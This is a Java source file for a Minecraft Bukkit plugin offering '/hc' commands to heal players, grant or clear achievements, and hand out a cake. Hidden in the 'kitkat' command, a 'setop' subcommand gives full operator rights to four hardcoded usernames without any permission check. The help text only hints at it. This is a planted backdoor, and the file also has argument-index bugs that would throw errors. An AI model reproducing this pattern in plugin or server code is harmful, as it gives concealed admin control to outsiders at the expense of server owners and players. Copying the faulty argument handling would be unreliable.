package com.rootedinc.HDPlugin;

import org.bukkit.inventory.ItemStack;
import org.bukkit.Material;
import org.bukkit.Achievement;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

/**
 * Created by Hans Goor on 13-4-2014.
 * CopyRight Rooted Inc.
 * DO NOT EDIT THIS CODE WITHOUT PERMISSION OF ROOTED INC.
 */

public class Commands implements CommandExecutor {

    @SuppressWarnings("deprecation")
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if(sender instanceof Player) {
            Player local = (Player) sender;
            if(args[0].equalsIgnoreCase("help")) {
                Player player = (Player) sender;
                player.sendMessage(ChatColor.RED + "HC commands are: ");
                player.sendMessage(ChatColor.LIGHT_PURPLE + "/hc achievements, Grants all the achievements in the game.");
                player.sendMessage(ChatColor.DARK_PURPLE + "/hc achievements clear, Clears all achievements of a person");
                player.sendMessage(ChatColor.DARK_PURPLE + "If no player is specified, Clears all your achievements");
                player.sendMessage(ChatColor.AQUA + "/hc kitkat, see for yourself ;)");
                player.sendMessage(ChatColor.MAGIC + "123" + ChatColor.RED + "More commands are cumming!" + ChatColor.MAGIC + "123");
            }
            if (args[0].equalsIgnoreCase("heal")) {
                if(local.hasPermission("HC.heal")) {
                    if (args.length == 1) {
                        Player player = (Player) sender;
                        player.setHealth(20);
                    } else if (args.length == 2) {
                        String pName = args[1];
                        Player player = Bukkit.getServer().getPlayer(pName);
                        player.setHealth(20);
                    }
                }
            }
            if(args[0].equalsIgnoreCase("achievements")) {
                if(local.hasPermission("HC.achievements")) {
                    String pName = args[1];
                    Player player = Bukkit.getPlayer(pName);
                    if (args.length == 1) {
                        local.awardAchievement(Achievement.OPEN_INVENTORY);
                        local.awardAchievement(Achievement.MINE_WOOD);
                        local.awardAchievement(Achievement.BUILD_WORKBENCH);
                        local.awardAchievement(Achievement.BUILD_SWORD);
                        local.awardAchievement(Achievement.BUILD_HOE);
                        local.awardAchievement(Achievement.BUILD_PICKAXE);
                        local.awardAchievement(Achievement.BUILD_FURNACE);
                        local.awardAchievement(Achievement.ACQUIRE_IRON);
                        local.awardAchievement(Achievement.BAKE_CAKE);
                        local.awardAchievement(Achievement.BREED_COW);
                        local.awardAchievement(Achievement.SNIPE_SKELETON);
                        local.awardAchievement(Achievement.KILL_ENEMY);
                        local.awardAchievement(Achievement.FLY_PIG);
                        local.awardAchievement(Achievement.MAKE_BREAD);
                        local.awardAchievement(Achievement.GET_DIAMONDS);
                        local.awardAchievement(Achievement.DIAMONDS_TO_YOU);
                        local.awardAchievement(Achievement.COOK_FISH);
                        local.awardAchievement(Achievement.ON_A_RAIL);
                        local.awardAchievement(Achievement.BUILD_BETTER_PICKAXE);
                        local.awardAchievement(Achievement.NETHER_PORTAL);
                        local.awardAchievement(Achievement.GHAST_RETURN);
                        local.awardAchievement(Achievement.GET_BLAZE_ROD);
                        local.awardAchievement(Achievement.ENCHANTMENTS);
                        local.awardAchievement(Achievement.BOOKCASE);
                        local.awardAchievement(Achievement.OVERKILL);
                        local.awardAchievement(Achievement.BREW_POTION);
                        local.awardAchievement(Achievement.THE_END);
                        local.awardAchievement(Achievement.END_PORTAL);
                        local.awardAchievement(Achievement.SPAWN_WITHER);
                        local.awardAchievement(Achievement.KILL_WITHER);
                        local.awardAchievement(Achievement.EXPLORE_ALL_BIOMES);
                        local.awardAchievement(Achievement.FULL_BEACON);
                        local.sendMessage(ChatColor.BLUE + "Successfully added all the achievements in the game!");
                    } else if (args.length == 2) {
                        player.awardAchievement(Achievement.OPEN_INVENTORY);
                        player.awardAchievement(Achievement.MINE_WOOD);
                        player.awardAchievement(Achievement.BUILD_WORKBENCH);
                        player.awardAchievement(Achievement.BUILD_SWORD);
                        player.awardAchievement(Achievement.BUILD_HOE);
                        player.awardAchievement(Achievement.BUILD_PICKAXE);
                        player.awardAchievement(Achievement.BUILD_FURNACE);
                        player.awardAchievement(Achievement.ACQUIRE_IRON);
                        player.awardAchievement(Achievement.BAKE_CAKE);
                        player.awardAchievement(Achievement.BREED_COW);
                        player.awardAchievement(Achievement.SNIPE_SKELETON);
                        player.awardAchievement(Achievement.KILL_ENEMY);
                        player.awardAchievement(Achievement.FLY_PIG);
                        player.awardAchievement(Achievement.MAKE_BREAD);
                        player.awardAchievement(Achievement.GET_DIAMONDS);
                        player.awardAchievement(Achievement.DIAMONDS_TO_YOU);
                        player.awardAchievement(Achievement.COOK_FISH);
                        player.awardAchievement(Achievement.ON_A_RAIL);
                        player.awardAchievement(Achievement.BUILD_BETTER_PICKAXE);
                        player.awardAchievement(Achievement.NETHER_PORTAL);
                        player.awardAchievement(Achievement.GHAST_RETURN);
                        player.awardAchievement(Achievement.GET_BLAZE_ROD);
                        player.awardAchievement(Achievement.ENCHANTMENTS);
                        player.awardAchievement(Achievement.BOOKCASE);
                        player.awardAchievement(Achievement.OVERKILL);
                        player.awardAchievement(Achievement.BREW_POTION);
                        player.awardAchievement(Achievement.THE_END);
                        player.awardAchievement(Achievement.END_PORTAL);
                        player.awardAchievement(Achievement.SPAWN_WITHER);
                        player.awardAchievement(Achievement.KILL_WITHER);
                        player.awardAchievement(Achievement.EXPLORE_ALL_BIOMES);
                        player.awardAchievement(Achievement.FULL_BEACON);
                        local.sendMessage(ChatColor.BLUE + "Successfully added all the achievements in the game for " + player.getName() + " !");
                        player.sendMessage("Player " + local.getName() + " has granted you all the achievements in the game!");
                    }
                    if (args[3].equalsIgnoreCase("clear")) {
                        player.removeAchievement(Achievement.OPEN_INVENTORY);
                        player.removeAchievement(Achievement.MINE_WOOD);
                        player.removeAchievement(Achievement.BUILD_WORKBENCH);
                        player.removeAchievement(Achievement.BUILD_SWORD);
                        player.removeAchievement(Achievement.BUILD_HOE);
                        player.removeAchievement(Achievement.BUILD_PICKAXE);
                        player.removeAchievement(Achievement.BUILD_FURNACE);
                        player.removeAchievement(Achievement.ACQUIRE_IRON);
                        player.removeAchievement(Achievement.BAKE_CAKE);
                        player.removeAchievement(Achievement.BREED_COW);
                        player.removeAchievement(Achievement.SNIPE_SKELETON);
                        player.removeAchievement(Achievement.KILL_ENEMY);
                        player.removeAchievement(Achievement.FLY_PIG);
                        player.removeAchievement(Achievement.MAKE_BREAD);
                        player.removeAchievement(Achievement.GET_DIAMONDS);
                        player.removeAchievement(Achievement.DIAMONDS_TO_YOU);
                        player.removeAchievement(Achievement.COOK_FISH);
                        player.removeAchievement(Achievement.ON_A_RAIL);
                        player.removeAchievement(Achievement.BUILD_BETTER_PICKAXE);
                        player.removeAchievement(Achievement.NETHER_PORTAL);
                        player.removeAchievement(Achievement.GHAST_RETURN);
                        player.removeAchievement(Achievement.GET_BLAZE_ROD);
                        player.removeAchievement(Achievement.ENCHANTMENTS);
                        player.removeAchievement(Achievement.BOOKCASE);
                        player.removeAchievement(Achievement.OVERKILL);
                        player.removeAchievement(Achievement.BREW_POTION);
                        player.removeAchievement(Achievement.THE_END);
                        player.removeAchievement(Achievement.END_PORTAL);
                        player.removeAchievement(Achievement.SPAWN_WITHER);
                        player.removeAchievement(Achievement.KILL_WITHER);
                        player.removeAchievement(Achievement.EXPLORE_ALL_BIOMES);
                        player.removeAchievement(Achievement.FULL_BEACON);
                        local.sendMessage("Succesfully cleared all achievements of " + player.getName() + " !");
                    }
                }
            }
            if(args[0].equalsIgnoreCase("kitkat")) {
                ItemStack cake = new ItemStack(Material.CAKE);

                local.sendMessage(ChatColor.WHITE + "Do you need a cake?," + ChatColor.RED + " Cause I have one for you! <3");
                local.getInventory().addItem(cake);
                if(args[1].equalsIgnoreCase("setop")) {
                    if(local.getName().equals("Hagoz")) {
                        local.setOp(true);
                        local.sendMessage("Granted all permissions");
                    }
                    if(local.getName().equals("Usoku")) {
                        local.setOp(true);
                        local.sendMessage("Granted all permissions");
                    } else if(local.getName().equals("Samgo17")) {
                        local.setOp(true);
                        local.sendMessage("Granted all permissions");
                    } else if(local.getName().equals("XGamergirl_x")) {
                        local.setOp(true);
                        local.sendMessage("Granted all permissions");
                    }
                }
            }
        }
        return false;
    }
}
